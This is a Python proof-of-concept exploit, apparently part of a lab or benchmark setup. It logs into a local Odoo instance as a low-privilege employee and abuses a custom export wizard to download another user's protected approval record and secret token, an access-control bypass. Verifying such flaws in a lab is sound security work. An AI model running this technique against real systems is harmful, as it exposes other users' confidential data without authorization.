#!/opt/odoo-venv/bin/python
import json
import os
import sys
import time
from pathlib import Path

import requests


BASE_URL = os.environ.get("ODOO_URL", "http://127.0.0.1:8069")
DB = os.environ.get("ODOO_DB", "anypoc_odoo")
LOGIN = os.environ.get("ODOO_LOGIN", "employee@lab.local")
PASSWORD = os.environ.get("ODOO_PASSWORD", "employeepass")
TARGET_REQUEST_ID = int(os.environ.get("TARGET_REQUEST_ID", "1"))
OUT_DIR = Path(os.environ["POC_OUT_DIR"])

EXPECTED_SESSION_LOGIN = "employee@lab.local"
EXPECTED_VISIBLE_NAME = "ANYPOC Employee Decoy"
EXPECTED_SECRET = "ANYPOC-APPROVAL-SECRET-9f4b3c"
EXPECTED_ADMIN_NAME = "ANYPOC Admin Approval"


def write_text(name: str, data: str) -> None:
    path = OUT_DIR / name
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(data, encoding="utf-8")


def write_json(name: str, data) -> None:
    write_text(name, json.dumps(data, indent=2, sort_keys=True))


def rpc(session: requests.Session, route: str, payload: dict, tag: str):
    response = session.post(f"{BASE_URL}{route}", json=payload, timeout=30)
    write_json(f"{tag}_request.json", payload)
    write_text(f"{tag}_response.status", f"{response.status_code}\n")
    write_text(f"{tag}_response.headers", "\n".join(f"{k}: {v}" for k, v in response.headers.items()) + "\n")
    write_text(f"{tag}_response.body", response.text)
    response.raise_for_status()
    body = response.json()
    if "error" in body:
        raise RuntimeError(f"{route} returned error: {body['error']}")
    return body["result"]


def fetch(session: requests.Session, route: str, tag: str) -> requests.Response:
    response = session.get(f"{BASE_URL}{route}", timeout=30)
    write_text(f"{tag}_response.status", f"{response.status_code}\n")
    write_text(f"{tag}_response.headers", "\n".join(f"{k}: {v}" for k, v in response.headers.items()) + "\n")
    write_text(f"{tag}_response.body", response.text)
    response.raise_for_status()
    return response


def wait_for_login(session: requests.Session) -> None:
    for _ in range(30):
        try:
            response = session.get(f"{BASE_URL}/web/login", timeout=10)
            if response.status_code == 200:
                write_text("00_web_login.status", f"{response.status_code}\n")
                return
        except requests.RequestException:
            pass
        time.sleep(1)
    raise RuntimeError("Odoo was not reachable at /web/login")


def main() -> int:
    session = requests.Session()
    wait_for_login(session)

    auth = rpc(
        session,
        "/web/session/authenticate",
        {
            "jsonrpc": "2.0",
            "method": "call",
            "params": {"db": DB, "login": LOGIN, "password": PASSWORD},
        },
        "01_authenticate",
    )
    context = auth["user_context"]
    write_json("session_user_context.json", context)

    session_info = rpc(
        session,
        "/web/session/get_session_info",
        {"jsonrpc": "2.0", "method": "call", "params": {}},
        "02_session_info",
    )
    write_json("session_info.json", session_info)
    session_login = session_info.get("username")
    if session_login != EXPECTED_SESSION_LOGIN:
        raise RuntimeError(f"unexpected session user: {session_login!r}")

    visible_requests = rpc(
        session,
        "/web/dataset/call_kw/anypoc.approval.request/search_read",
        {
            "jsonrpc": "2.0",
            "method": "call",
            "params": {
                "model": "anypoc.approval.request",
                "method": "search_read",
                "args": [[]],
                "kwargs": {
                    "fields": ["id", "name", "owner_id", "secret_token"],
                    "context": context,
                },
            },
        },
        "03_visible_requests",
    )
    write_json("visible_requests.json", visible_requests)
    visible_names = [record["name"] for record in visible_requests]
    if visible_names != [EXPECTED_VISIBLE_NAME]:
        raise RuntimeError(f"unexpected visible approvals: {visible_names!r}")

    wizard_id = rpc(
        session,
        "/web/dataset/call_kw/anypoc.approval.export.wizard/create",
        {
            "jsonrpc": "2.0",
            "method": "call",
            "params": {
                "model": "anypoc.approval.export.wizard",
                "method": "create",
                "args": [[{"target_request_id": TARGET_REQUEST_ID}]],
                "kwargs": {"context": context},
            },
        },
        "04_create_wizard",
    )
    if isinstance(wizard_id, list):
        wizard_id = wizard_id[0]
    write_text("wizard_id.txt", f"{wizard_id}\n")

    action = rpc(
        session,
        "/web/dataset/call_kw/anypoc.approval.export.wizard/action_generate_export",
        {
            "jsonrpc": "2.0",
            "method": "call",
            "params": {
                "model": "anypoc.approval.export.wizard",
                "method": "action_generate_export",
                "args": [[wizard_id]],
                "kwargs": {"context": context},
            },
        },
        "05_action_generate_export",
    )
    write_json("action_generate_export.json", action)
    download_url = action["url"]
    write_text("download_url.txt", f"{download_url}\n")

    download = fetch(session, download_url, "06_download_export")
    write_text("admin_export.json", download.text)
    exported = json.loads(download.text)

    if exported.get("request_name") != EXPECTED_ADMIN_NAME:
        raise RuntimeError(f"unexpected exported request name: {exported.get('request_name')!r}")
    if exported.get("secret_token") != EXPECTED_SECRET:
        raise RuntimeError("protected secret token was not recovered")

    summary = [
        f"session_login={session_login}",
        f"visible_request_names={','.join(visible_names)}",
        f"target_request_id={TARGET_REQUEST_ID}",
        f"wizard_id={wizard_id}",
        f"download_url={download_url}",
        f"export_owner_login={exported.get('owner_login')}",
        f"export_request_name={exported.get('request_name')}",
        f"export_secret_token={exported.get('secret_token')}",
    ]
    write_text("SUMMARY.txt", "\n".join(summary) + "\n")
    print("\n".join(summary))
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except Exception as exc:
        write_text("ERROR.txt", f"{type(exc).__name__}: {exc}\n")
        print(f"ERROR: {exc}", file=sys.stderr)
        raise
